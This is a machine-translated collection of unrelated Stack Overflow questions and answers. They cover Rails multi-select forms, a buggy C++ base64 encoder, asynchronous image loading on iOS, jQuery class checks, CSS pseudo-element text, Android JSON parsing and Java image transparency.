阅读约翰·本德 (John Bender) 的Tap [vs.](https://coderwall.com/johnbender) [Click: Death by Ignorance](https://coderwall.com/p/bdxjzg)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-04T11:54:13.453

这个代码片段对我有用

```
var ua = navigator.userAgent, 
event = (ua.match(/iPad|Android/i)) ? "touchstart" : "click";

$("button,a").bind(event, function()
{
    $(this).trigger('click');
}); 
```

# ruby-on-rails - collection_select 的多个值

> ID：14097353
> 
> 赞同：7
> 
> 时间：2012-12-31T04:14:50.983
> 
> 标签：ruby-on-rails, forms

我试图在我的表单中包含以下 HTML 代码：

```
 <select name="user[language_ids][]">
    <option value="">Please select</option>
    <option value="1" selected="selected">English</option>
    <option value="2">Spanish</option>
  </select>

  <select name="user[language_ids][]">
    <option value="">Please select</option>
    <option value="1" selected="selected">English</option>
    <option value="2">Spanish</option>
  </select> 
```

允许用户在注册时选择两种语言。

我试过这个：

```
<%= f.label :languages %>
<%= f.collection_select(:language_ids, Language.all, :id, :name) %>
<%= f.collection_select(:language_ids, Language.all, :id, :name) %> 
```

还有这个：

```
<%= f.label :languages %>
<%= f.collection_select(:language_ids[], Language.all, :id, :name) %>
<%= f.collection_select(:language_ids[], Language.all, :id, :name) %> 
```

查看答案后，我尝试了以下方法：

```
<%= collection_select(:user, :language_ids, Language.all, :id, :name, {}, {:name => 'user[language_ids][]' }) %>
    <%= collection_select(:user, :language_ids, Language.all, :id, :name, {}, {:name => 'user[language_ids][]' }) %> 
```

但是这里的问题是两个选择都具有相同的 ID，而且它们与表单构建器没有关联`f`

对最好的方法有什么想法吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-31T06:00:06.600

尝试，

```
<%= f.collection_select(:language_ids, Language.all, :id, :name,{}, {:multiple => true}) %> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-10T18:55:39.767

您可以使用创建字段集合 [`fields_for`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormHelper.html#method-i-fields_for)。
这两个选择将具有相同的 id，但 [`collection_select`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormOptionsHelper.html#method-i-collection_select) 采用包含 html 选项的可选散列，您可以在其中设置自定义 id。

```
<%= f.fields_for :language_ids do |language| %>
  <%= language.collection_select(nil, Language.all, :id, :name,
        {include_blank: "Please select", selected: 1},
        {id: :user_language_id_1}) %>
  <%= language.collection_select(nil, Language.all, :id, :name,
        {include_blank: "Please select", selected: 1},
        {id: :user_language_id_2}) %>
<% end %> 
```

生成以下输出：

```
<select id="user_language_id_1" name="user[language_ids][]">
  <option value="">Please select</option>
  <option value="1" selected="selected">English</option>
  <option value="2">Spanish</option>
</select>

<select id="user_language_id_2" name="user[language_ids][]">
  <option value="">Please select</option>
  <option value="1" selected="selected">English</option>
  <option value="2">Spanish</option>
</select> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-10T16:01:12.820

由于您在选择的名称属性中写了“user[language_ids][]”，我不得不假设您想要一个多选框。你应该做这个：

```
f.collection_select (:language_ids, Language.all, :id, :name, 
{:prompt => true}, {:multiple => true}) 
```

当然，这不是一个非常有据可查的功能。

编辑：进一步查看您的示例和一些答案，我想指出一些事情：

*   您的示例将提示“请选择”作为选择框的第一个选项，但是您希望在两个示例中都选择“英语”。如果您希望预先选择一个选项，它也是第一个选项选择框，那你为什么会有提示选项呢？一个用它来强迫用户选择一些东西。

*   您在一个答案中写道，您想要多选而不是多选，这是您不想要 :multiple => true 解决方案的原因。我仍然建议您使用它，但也许您确实有必要的用例。因此，我建议您直接使用 select_tag 助手（我认为您不会使用表单标签助手来实现）：

    ```
    select_tag "user[language_ids][]", 
    options_from_collection_for_select(Language.all, "id", "name"), 
    :prompt => true, :id => "user_language_ids" 
    ```

    这里的关键是，多个选择必须有不同的 id，你必须明确地传递它，所以它会在你手中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-08T17:00:43.110

你应该能够做这样的事情：

```
<%= f.label :languages %>
<%= f.collection_select(:language_ids, Language.all, :id, :name, {}, {id => "language_1", :name => "user[language_ids][]"}) %>
<%= f.collection_select(:language_ids, Language.all, :id, :name, {}, {id => "language_2", :name => "user[language_ids][]"}) %> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-09T14:26:59.597

基本上发送具有相同属性的 2 个（或更多）字段是行不通的，因为 params 将被转换为哈希：`{language_ids: [1], language_ids: [2]}`并且由于您具有相同的键，因此最后一个将覆盖前一个。

```
{a: 1, a: 2}[:a] #=> 2 
```

为了规避这个问题，您需要创建不同的属性，然后将它们连接在一起。为此，您需要模型中的外观属性：

```
class Language
  attr_writer :language_one_id, :language_two_id

  before_save :gather_languages

  def gather_languages
    self.language_ids= [language_one_id, language_two_id]
  end

  # for the form to display chosen lang (idem with two)
  def language_id
    language_ids.first
  end
end

# view/_form
=f.select :language_one_id, Language.all.map {|l| [l.name, l.id]}
=f.select :language_two_id, Language.all.map {|l| [l.name, l.id]} 
```

但坦率地说，我认为你在这里违反惯例会让你的生活变得更加艰难（我会使用复选框）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-01-10T13:24:57.563

您可以像这样使用 fields_for ：

```
<%= form_for @user do |f| %>
 ...
<h2>Languages</h2>
<%= fields_for :languages do |lang_form| %>
  <%= lang_form.collection_select :language_id, Language.all, :id, :name %>
<% end %>
..
<% end %> 
```

在您的控制器上，在您的新方法或编辑方法中，您可以执行此操作以接受 2 种语言

```
2.times { @user.languages.build } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-01-01T17:02:22.577

尝试这个：

```
<%=select_tag "language_ids[]" options_for_select([['Please select','']]+Language.all.map{|ln|[ln.name,ln.id]})%> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-01-10T13:07:01.450

您可以将“second_language”列添加到表中，然后使其具有与第一个语言列相同的内容。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-01-10T15:49:53.377

首先你必须编辑你的用户模型：

用户.rb

```
has_many :languages
accepts_nested_attributes_for :languages 
```

接下来生成模型：

```
$> rails g model language user_id:integer name 
```

语言.rb

```
belongs_to  :user 
```

users_controller.rb（可能在“新”操作中）

```
2.times do
  language = @user.language.build
end 
```

_form.html.erb

```
<%= form_for @user do |f| %>
  <%= f.fields_for :languages do |lang| %>
    <%= lang.label :name, "Name" %><br />
    <%= lang.select :name, Language.all.collect {|l| [l.name, l.id]}, prompt: 'Please select' %><br /> 
  <%= end %>     
  <p><%= f.submit "Submit" %></p>
<% end %> 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2019-05-09T11:28:54.497

使用宝石，宝石“茧”

以您要添加字段的模型的形式

```
 <div class="form-group">
    <%= f.fields_for :photoproducts do |forms_fields| %>
      <% render partial: "shared/photoproducts_fields", locals: {f: forms_fields} %>
    <% end %>
    <%= link_to_add_association('+ Foto', f, :photoproducts, type: "button", class: "btn btn-primary btn-sm") %>
  </div> 
```

（在这个例子中，我有一个产品模板，我正在向其中添加照片）

然后在项目根目录的共享文件夹中创建一个部分。

-

## 项目/共享/_fotoproduto_fields.html.erb

```
<div class="nested-fields">
  <%= link_to_remove_association('remove photo', f, type: "button", class: "btn btn-danger btn-sm") %>
  <div class="photoproducts">
    <div class="form-group">
      <label class="control-label"><%= f.label :name %></label>
      <%= f.text_field :name, class: "form-control", type: "text" %>
    </div>
    <div class="form-group">
      <label class="control-label"> photo</label>
      <%= f.file_field :files, class: "form-control" %><br/><br/>
    </div>
  </div>
</div> 
```

这样你得到一个更动态的形式

请记住将参数放入嵌套属性的控制器中，并放入创建方法中，即模型的构建。

例如：@products.photoproducts.build

# c++ - Base 64 编码丢失数据

> ID：14097360
> 
> 赞同：1
> 
> 时间：2012-12-31T04:15:58.230
> 
> 标签：c++, encoding, base64, encode, encoder

这是我第四次尝试进行 base64 编码。我的第一次尝试工作，但它不是标准的。也超级慢！！！我使用了向量和 push_back 并擦除了很多。

所以我决定重写它，这要快得多！除了它会丢失数据。-__- 我需要尽可能快的速度，因为我正在压缩像素缓冲区并对压缩字符串进行 base64 编码。我正在使用 ZLib。图像是 1366 x 768 所以是的。

我不想复制我在网上找到的任何代码，因为...嗯，我喜欢自己写东西，我不喜欢担心版权问题或不得不在我的代码中放置大量来自不同来源的学分......

无论如何，我的代码如下。它非常简短。

```
const static std::string Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

inline bool IsBase64(std::uint8_t C)
{
    return (isalnum(C) || (C == '+') || (C == '/'));
}

std::string Copy(std::string Str, int FirstChar, int Count)
{
    if (FirstChar <= 0)
        FirstChar = 0;
    else
        FirstChar -= 1;
    return Str.substr(FirstChar, Count);
}

std::string DecToBinStr(int Num, int Padding)
{
    int Bin = 0, Pos = 1;
    std::stringstream SS;
    while (Num > 0)
    {
        Bin += (Num % 2) * Pos;
        Num /= 2;
        Pos *= 10;
    }
    SS.fill('0');
    SS.width(Padding);
    SS << Bin;
    return SS.str();
}

int DecToBinStr(std::string DecNumber)
{
    int Bin = 0, Pos = 1;
    int Dec = strtol(DecNumber.c_str(), NULL, 10);

    while (Dec > 0)
    {
        Bin += (Dec % 2) * Pos;
        Dec /= 2;
        Pos *= 10;
    }
    return Bin;
}

int BinToDecStr(std::string BinNumber)
{
    int Dec = 0;
    int Bin = strtol(BinNumber.c_str(), NULL, 10);

    for (int I = 0; Bin > 0; ++I)
    {
        if(Bin % 10 == 1)
        {
            Dec += (1 << I);
        }
        Bin /= 10;
    }
    return Dec;
}

std::string EncodeBase64(std::string Data)
{
    std::string Binary = std::string();
    std::string Result = std::string();

    for (std::size_t I = 0; I < Data.size(); ++I)
    {
        Binary += DecToBinStr(Data[I], 8);
    }

    for (std::size_t I = 0; I < Binary.size(); I += 6)
    {
        Result += Base64Chars[BinToDecStr(Copy(Binary, I, 6))];
        if (I == 0) ++I;
    }

    int PaddingAmount = ((-Result.size() * 3) & 3);
    for (int I = 0; I < PaddingAmount; ++I)
        Result += '=';

    return Result;
}

std::string DecodeBase64(std::string Data)
{
    std::string Binary = std::string();
    std::string Result = std::string();

    for (std::size_t I = Data.size(); I > 0; --I)
    {
        if (Data[I - 1] != '=')
        {
            std::string Characters = Copy(Data, 0, I);
            for (std::size_t J = 0; J < Characters.size(); ++J)
                Binary += DecToBinStr(Base64Chars.find(Characters[J]), 6);
            break;
        }
    }

    for (std::size_t I = 0; I < Binary.size(); I += 8)
    {
        Result += (char)BinToDecStr(Copy(Binary, I, 8));
        if (I == 0) ++I;
    }

    return Result;
} 
```

我一直在使用上面这样的：

```
int main()
{
    std::string Data = EncodeBase64("IMG." + ::ToString(677) + "*" + ::ToString(604));  //IMG.677*604
    std::cout<<DecodeBase64(Data);        //Prints IMG.677*601
} 
```

正如您在上面看到的，它打印了错误的字符串。它相当接近，但由于某种原因，4 变成了 1！

现在，如果我这样做：

```
int main()
{
    std::string Data = EncodeBase64("IMG." + ::ToString(1366) + "*" + ::ToString(768));  //IMG.1366*768
    std::cout<<DecodeBase64(Data);        //Prints IMG.1366*768
} 
```

它打印正确..我不确定发生了什么或从哪里开始寻找。

以防万一有人好奇并想看看我的其他尝试（缓慢的尝试）： http: [//pastebin.com/Xcv03KwE](http://pastebin.com/Xcv03KwE)

我真的希望有人能对加快速度或至少弄清楚我的代码有什么问题有所了解：l

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:41:30.133

主要的编码问题是您没有考虑不是 6 位倍数的数据。在这种情况下，您拥有的最终结果`4`将被转换为`0100`，而不是`010000`因为没有更多位要读取。你应该用`0`s 填充。

像这样改变你之后`Copy`，最终的编码字符是`Q`，而不是原来的`E`.

```
std::string data = Str.substr(FirstChar, Count);
while(data.size() < Count) data += '0';
return data; 
```

此外，您添加填充的逻辑似乎已关闭，因为在这种情况下`=`它添加了太多。`=`

至于对速度的评论，我主要集中在尝试减少您对`std::string`. 考虑到可以使用按位运算符直接读取源，您当前将数据转换为具有 0 和 1 的字符串的方式非常低效。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T05:46:09.677

我不确定我是否可以轻松地想出一种更慢的方法来进行 Base-64 转换。

该代码需要 4 个标头（在带有 G++ 4.7.1 的 Mac OS X 10.7.5 上）和编译器选项`-std=c++11`以使其`#include <cstdint>`可接受：

```
#include <string>
#include <iostream>
#include <sstream>
#include <cstdint> 
```

它还需要一个`ToString()`未定义的函数；我建立：

```
std::string ToString(int value)
{
    std::stringstream ss;
    ss << value;
    return ss.str();
} 
```

您的代码`main()`（即使用该`ToString()`函数的代码）有点奇怪：为什么需要从片段构建字符串而不是简单地使用`"IMG.677*604"`？

此外，值得打印出中间结果：

```
int main()
{
    std::string Data = EncodeBase64("IMG." + ::ToString(677) + "*" + ::ToString(604));
    std::cout << Data << std::endl;
    std::cout << DecodeBase64(Data) << std::endl;        //Prints IMG.677*601
} 
```

这产生：

```
SU1HLjY3Nyo2MDE===
IMG.677*601 
```

输出字符串 ( `SU1HLjY3Nyo2MDE===`) 长 18 个字节；这一定是错误的，因为有效的 Base-64 编码字符串的长度必须是 4 个字节的倍数（因为三个 8 位字节被编码为四个字节，每个字节包含 6 位原始数据）。这立即告诉我们有问题。您应该只得到零个、一个或两个填充 ( `=`) 字符；从来没有三个。这也证实了有问题。

删除两个填充字符会留下有效的 Base-64 字符串。当我使用自己的自制 Base-64 编码和解码功能来解码您的（截断的）输出时，它给了我：

```
Base64:
0x0000: SU1HLjY3Nyo2MDE=
Binary:
0x0000: 49 4D 47 2E 36 37 37 2A 36 30 31 00               IMG.677*601. 
```

因此，您似乎已经对终止字符串的 null 进行了编码。当我编码`IMG.677*604`时，我得到的输出是：

```
Binary:
0x0000: 49 4D 47 2E 36 37 37 2A 36 30 34                  IMG.677*604
Base64: SU1HLjY3Nyo2MDQ= 
```

* * *

你说你想加快你的代码。除了修复它以使其正确编码（我还没有真正研究过解码）之外，您还需要避免您所做的所有字符串操作。它应该是一个位操作练习，而不是字符串操作练习。

我的代码中有 3 个小的编码例程，用于对三胞胎、双胞胎和单胞胎进行编码：

```
/* Encode 3 bytes of data into 4 */
static void encode_triplet(const char *triplet, char *quad)
{
    quad[0] = base_64_map[(triplet[0] >> 2) & 0x3F];
    quad[1] = base_64_map[((triplet[0] & 0x03) << 4) | ((triplet[1] >> 4) & 0x0F)];
    quad[2] = base_64_map[((triplet[1] & 0x0F) << 2) | ((triplet[2] >> 6) & 0x03)];
    quad[3] = base_64_map[triplet[2] & 0x3F];
}

/* Encode 2 bytes of data into 4 */
static void encode_doublet(const char *doublet, char *quad, char pad)
{
    quad[0] = base_64_map[(doublet[0] >> 2) & 0x3F];
    quad[1] = base_64_map[((doublet[0] & 0x03) << 4) | ((doublet[1] >> 4) & 0x0F)];
    quad[2] = base_64_map[((doublet[1] & 0x0F) << 2)];
    quad[3] = pad;
}

/* Encode 1 byte of data into 4 */
static void encode_singlet(const char *singlet, char *quad, char pad)
{
    quad[0] = base_64_map[(singlet[0] >> 2) & 0x3F];
    quad[1] = base_64_map[((singlet[0] & 0x03) << 4)];
    quad[2] = pad;
    quad[3] = pad;
} 
```

这是作为 C 代码编写的，而不是使用本机 C++ 习惯用法，但显示的代码应该使用 C++ 编译（与源代码中其他地方的 C99 初始化程序不同）。该`base_64_map[]`数组对应于您的`Base64Chars`字符串。传入的`pad`字符是正常的`'='`，但可能是`'\0'`因为我使用的系统有关于不需要填充的古怪想法（在我参与代码之前，它使用非标准字母来引导）并且代码同时处理非标准和[RFC 3548](http://www.ietf.org/rfc/rfc3548.txt)标准。

驱动代码是：

```
/* Encode input data as Base-64 string.  Output length returned, or negative error */
static int base64_encode_internal(const char *data, size_t datalen, char *buffer, size_t buflen, char pad)
{
    size_t outlen = BASE64_ENCLENGTH(datalen);
    const char *bin_data = (const void *)data;
    char *b64_data = (void *)buffer;

    if (outlen > buflen)
        return(B64_ERR_OUTPUT_BUFFER_TOO_SMALL);
    while (datalen >= 3)
    {
        encode_triplet(bin_data, b64_data);
        bin_data += 3;
        b64_data += 4;
        datalen -= 3;
    }
    b64_data[0] = '\0';

    if (datalen == 2)
        encode_doublet(bin_data, b64_data, pad);
    else if (datalen == 1)
        encode_singlet(bin_data, b64_data, pad);
    b64_data[4] = '\0';
    return((b64_data - buffer) + strlen(b64_data));
}

/* Encode input data as Base-64 string.  Output length returned, or negative error */
int base64_encode(const char *data, size_t datalen, char *buffer, size_t buflen)
{
    return(base64_encode_internal(data, datalen, buffer, buflen, base64_pad));
} 
```

常数`base64_pad`是; `'='`还有一个`base64_encode_nopad()`功能可以`'\0'`代替。这些错误有些随意，但与代码相关。

要摆脱这一点的要点是，您应该进行位操作并构建一个字符串，该字符串是给定输入的 4 个字节的精确倍数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T05:45:24.640

```
std::string EncodeBase64(std::string Data)
{
    std::string Binary = std::string();
    std::string Result = std::string();

    for (std::size_t I = 0; I < Data.size(); ++I)
    {
        Binary += DecToBinStr(Data[I], 8);
    }

    if (Binary.size() % 6)
    {
        Binary.resize(Binary.size() + 6 - Binary.size() % 6, '0');
    }

    for (std::size_t I = 0; I < Binary.size(); I += 6)
    {
        Result += Base64Chars[BinToDecStr(Copy(Binary, I, 6))];
        if (I == 0) ++I;
    }

    if (Result.size() % 4)
    {
        Result.resize(Result.size() + 4 - Result.size() % 4, '=');
    }

    return Result;
} 
```

# iphone - 从网络加载图像使应用程序挂起

> ID：14097363
> 
> 赞同：0
> 
> 时间：2012-12-31T04:16:16.437
> 
> 标签：iphone, ios, uitableview, uiimage

我正在我的 iPhone 应用程序中从网络加载图像。我将此图像用于表格单元格的图像视图。应用程序启动后几秒钟，所有图像都已完全加载。但表格的滚动不流畅。有延迟。滚动发生在手势后几秒钟。还有抽搐。我正在使用这段代码

```
UIImage *imagefromWeb = [UIImage imageWithData:[NSData dataWithContentsOfURL:[IconArray objectAtIndex:indexPath.row]]];
        CGSize newSize= CGSizeMake(45.0,45.0);
        UIGraphicsBeginImageContextWithOptions(newSize, NO, 0.0);
        [imagefromWeb drawInRect:CGRectMake(0, 0, newSize.width, newSize.height)];
        UIImage *newImage = UIGraphicsGetImageFromCurrentImageContext();
        UIGraphicsEndImageContext();
        cell.imageView.image=newImage; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:22:04.463

您正在同步加载图像，这就是问题尝试使用以下代码异步下载图像的原因：

```
 dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,  0ul);
    dispatch_async(queue, ^{

        NSURL *imageURL=[NSURL URLWithString:urlString];
        NSData *imageData=[NSData dataWithContentsOfURL:imageURL];
        dispatch_sync(dispatch_get_main_queue(), ^{
            CustomCell *cell = (CustomCell *)[tableView cellForRowAtIndexPath:indexPath];
            cell.imageView.image=[UIImage imageWithData:imageData];
            [cell setNeedsLayout];

        });
    }); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T04:30:19.693

您可以使用“sdwebimage”的 uiimageview 类别，希望它能解决您的问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T04:24:16.123

您可以使用延迟加载从 URL 加载图像，请参阅以下示例链接，

[http://developer.apple.com/library/ios/#samplecode/LazyTableImages/Introduction/Intro.html](http://developer.apple.com/library/ios/#samplecode/LazyTableImages/Introduction/Intro.html)

希望它会帮助你......

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-31T04:24:21.107

此代码：`[NSData dataWithContentsOfURL:[IconArray objectAtIndex:indexPath.row]`使应用程序挂起。因为`dataWithContentsOfURL`方法是同步调用。你永远不会在主线程上调用这样的同步调用，它会让你的 UI 没有响应。

```
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{

    UIImage *imagefromWeb = [UIImage imageWithData:[NSData dataWithContentsOfURL:[IconArray objectAtIndex:indexPath.row]]];
    CGSize newSize= CGSizeMake(45.0,45.0);
    UIGraphicsBeginImageContextWithOptions(newSize, NO, 0.0);
    [imagefromWeb drawInRect:CGRectMake(0, 0, newSize.width, newSize.height)];
    UIImage *newImage = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    dispatch_async(dispatch_get_main_queue(), ^{
        cell.imageView.image=newImage;
   });

}); 
```

有很多开源库用于将图像加载到 tableView 并缓存它们，请检查：

1.  [**HJCache**](https://github.com/markofjohnson/HJCache)
2.  [**SDWebImage**](https://github.com/rs/SDWebImage)
3.  [**懒表图像**](http://developer.apple.com/library/ios/#samplecode/LazyTableImages/Introduction/Intro.html)

# haskell - 在 Haddock 文档中嵌入粗体标记

> ID：14097365
> 
> 赞同：2
> 
> 时间：2012-12-31T04:16:32.403
> 
> 标签：haskell, haddock

在使用黑线鳕标记记录 Haskell 源代码时，有没有办法获得粗体文本？有 / / 表示强调，但没有明显的表示强。我希望有一个优雅的黑客，但我会满足于一个笨拙的解决方法......

亚足联

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T07:31:46.213

将“@”添加到您的文本中，它将是粗体：

只加粗一个单词，加粗到第一个分隔符，如空格等......

`@text1 text2`

这里粗体只有 text1 个单词。

或者用粗体包裹一些文本：

`@bold text examples in haddock@`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-13T09:58:04.030

该功能昨天被推送到 HEAD。

标记是`__This is some bold text__`. 您不需要转义单个下划线。

# jquery - 如何确定多个对象之一是否具有某个类？

> ID：14097373
> 
> 赞同：1
> 
> 时间：2012-12-31T04:17:04.860
> 
> 标签：jquery, css

我有 HTML 可以这样说：

```
<ul>
<li class="test"></li>
<li class="test"></li>
<li class="test"></li>
<li></li>
</ul> 
```

现在我如何测试是否有一个或多个`li`具有类`test`？

`$("li").hasClass("test");`似乎没有做这项工作...

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:19:09.647

> 现在我如何测试是否有一个或多个`li`具有类`test`？

`$("li.test").size() > 0`表示至少有一个`li`具有类`test`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T04:27:16.593

```
if ($("li.test").length > 0) {
    //your code
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T04:18:03.860

如果你有一个`li`选择，你可以使用`.is(".test")`

如果你想知道有多少人有这门课，你可以做`$("li.test").length`

# c#-4.0 - 如果子类已经具有属性，则不对父类验证 claimprincipalpermission

> ID：14097376
> 
> 赞同：0
> 
> 时间：2012-12-31T04:18:07.193
> 
> 标签：c#-4.0, claims-based-identity, role-base-authorization

我有一个基类和派生类，例如

```
[ClaimsPrincipalPermission(SecurityAction.Demand, Resource = "Base",
                           Operation = "Create")]
public abstract class Base 
{
}

[ClaimsPrincipalPermission(SecurityAction.Demand, Resource = "Derived",
                           Operation = "Create")]
public class Derived : Base
{
} 
```

如果我正在创建派生类对象，授权管理器永远不会检查基类。

```
public class AuthorisationManager : ClaimsAuthorizationManager
{
    public override bool CheckAccess(AuthorizationContext context)
    {
        var resource = context.Resource.First().Value;
        var action = context.Action.First().Value;
        return context.Principal.HasClaim(resource, action);
    }
} 
```

知道如何实现它应该同时检查派生类和基类吗？实际上我希望如果其中任何一个有权限，则应该允许创建对象。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T11:00:33.487

那是你的真实情况吗？或者您想在 ASP.NET 等应用程序框架的上下文中使用它吗？

但是 IIRC 这是 CAS 权限的行为 - 您可以尝试使用良好的旧 PrincipalPermission 来查看推导的行为是否相同。

# html - css中的文本变量

> ID：14097380
> 
> 赞同：2
> 
> 时间：2012-12-31T04:19:25.510
> 
> 标签：html, css

我正在维护一个发布信息的简单网站。大多数信息是静态的，但有些日期会定期更改。这些日期列在网站的各个页面上，我想简化更新。

原则上，我想定义一个变量，比如@date（或我需要的任何格式），我可以在它出现的每个地方替换它并且只定义一次。我想最简单的（？）将是使用 javascript，但该网站不使用它，所以我认为这有点像用佳能射击知更鸟。

所以，我的问题是，是否可以只使用 html 和 css 来做这样的事情？

谢谢！！ps：我不是程序员，我是做志愿者工作的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:22:02.847

HTML：

```
<p>This is my content. Some event will happen on <span class="date1"></span>.</p> 
```

CSS：

```
.date1:before {
  content: '12/30/2012';
} 
```

[演示](http://jsbin.com/iboquz/1/edit)

[关于 :before 选择器的文档](https://developer.mozilla.org/en-US/docs/CSS/%3a%3abefore)

虽然我不会像这样将我的内容与 CSS 混合......它会起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T09:23:13.900

HTML 中没有变量，因为 HTML 不是编程语言。您需要使用可让您生成 HTML 的创作工具，以便将某些数据复制到不同的位置，或者自动插入某些信息（例如，上次更新的日期）。例如，如果 PHP 在服务器上可用，您可以使用它。

# android - JSONArray 在解析时返回 null

> ID：14097381
> 
> 赞同：1
> 
> 时间：2012-12-31T04:19:40.887
> 
> 标签：android, json, api

我想解析这个 JSON 字符串：

```
{
  lhs: "1 British pound",
  rhs: "1.6152 U.S. dollars",
  error: "",
  icc: true
} 
```

但 JSONArray 返回空值。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T04:23:36.543

当前的 json 字符串包含一个`jsonObject`而不是将`JsonArray`其解析为：

```
// Convert String to Json Object
JSONObject jsonObject = new JSONObject("Pass_Your_Json_String");

// get lhs 
String str_lhs=jsonObject.getString("lhs");

// get rhs
String str_rhs=jsonObject.getString("rhs");

  //..... 
```

# java - 如何在Java中使绘制的图像透明

> ID：14097386
> 
> 赞同：6
> 
> 时间：2012-12-31T04:20:54.647
> 
> 标签：java, transparency, imageicon

我让动画在我的蛇克隆游戏中工作。但是基于图片的问题是图像没有透明度（注意圆形图片的白色背景。编程方面，是否有解决方案可以在这些绘制的图像中包含透明度？

这是一张包含我的代码和程序输出的图片。

![在此处输入图像描述](../Images/0441ee3448a791e38cf21d6b0b8db533.png)

PS 附带说明一下，我决定粘贴直接链接而不是 IMG 代码，因为我似乎无法让它显示在 StackOverFlow 上。我在 IMG 代码前面放了一个感叹号，但它不起作用，所以这里是直接链接。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-31T05:02:02.363

正如提到的另一个答案，最简单的方法可能是简单地使用具有透明背景的 PNG 图像（您可以使用 GIMP 之类的图像编辑器创建这些图像）。或者，如果您仅限于具有纯色背景的 PNG 图像，以下是如何将 PNG 中的给定颜色（例如白色）更改为透明的示例：

![在此处输入图像描述](../Images/5b12655a5d53b0a379a9aa10f08ce07c.png)

```
import java.awt.*;
import java.awt.image.*;
import javax.swing.*;

public class SimpleFrame extends JFrame {
   JPanel mainPanel = new JPanel() {
      ImageIcon originalIcon = new ImageIcon("~/Pictures/apple.png");

      ImageFilter filter = new RGBImageFilter() {
         int transparentColor = Color.white.getRGB() | 0xFF000000;

         public final int filterRGB(int x, int y, int rgb) {
            if ((rgb | 0xFF000000) == transparentColor) {
               return 0x00FFFFFF & rgb;
            } else {
               return rgb;
            }
         }
      };

      ImageProducer filteredImgProd = new FilteredImageSource(originalIcon.getImage().getSource(), filter);
      Image transparentImg = Toolkit.getDefaultToolkit().createImage(filteredImgProd);

      public void paintComponent(Graphics g) {
         g.setColor(getBackground());
         g.fillRect(0, 0, getSize().width, getSize().height);

         // draw the original icon
         g.drawImage(originalIcon.getImage(), 100, 10, this);
         // draw the transparent icon
         g.drawImage(transparentImg, 140, 10, this);
      }
   };

   public SimpleFrame() {
      super("Transparency Example");

      JPanel content = (JPanel)getContentPane();
      mainPanel.setBackground(Color.black);
      content.add("Center", mainPanel);
   }

   public static void main(String[] argv) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            SimpleFrame c = new SimpleFrame();
            c.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            c.setSize(280,100);
            c.setVisible(true);
         }
      });
   }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-31T04:38:27.963

不要使用油漆来绘制图像。使用其他一些使用 alpha 的程序，如 Paint.net 或 Photoshop……如果你要永远使用圆圈，那么你可以使用 g.drawOval(x, y, w, h)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-12T15:13:18.873

```
 public BufferedImage makeTransparentImage(BufferedImage br) {
    for (int i = 0; i < br.getHeight(); i++) {
        for (int j = 0; j < br.getWidth(); j++) {
            Color c = new Color(br.getRGB(j, i));
            int r = c.getRed();
            int b = c.getBlue();
            int g = c.getGreen();
            if ((r == 255 && b == 255 && g == 255)) {
                System.out.println("r g b " + r + g + b);
                br.setRGB(j, i, 0xFF000000);
            }
        }
    }
    return br;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-08-30T06:28:37.987

如果你画一张简单的图片，我知道的最简单和最快的方法... 在 Macrosoft PowerPoint 中绘制一张图片，然后单击“另存为图片”以获得透明背景。下一个...

```
public class Node {
Image nodeImage[] = new Image[3];

public Node() {
    try {
        String address = "C:\\Users\\Desktop\\practice\\Simulation\\img\\";
        nodeImage[0] = ImageIO.read(new File(address + "Node_noVehicle.png"));
        nodeImage[1] = ImageIO.read(new File(address + "Node_setVehicle.png"));
        nodeImage[2] = ImageIO.read(new File(address + "Node_inVehicle.png"));
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
}

@Override
protected void paintComponent(Graphics g) {
  super.paintComponent(g);  
  Graphics2D g2dtemp = (Graphics2D) g.create();
  g2dtemp.drawImage(Node.nodeImage[0],(int)x,(int)y,width,height,this);
} 
```

}

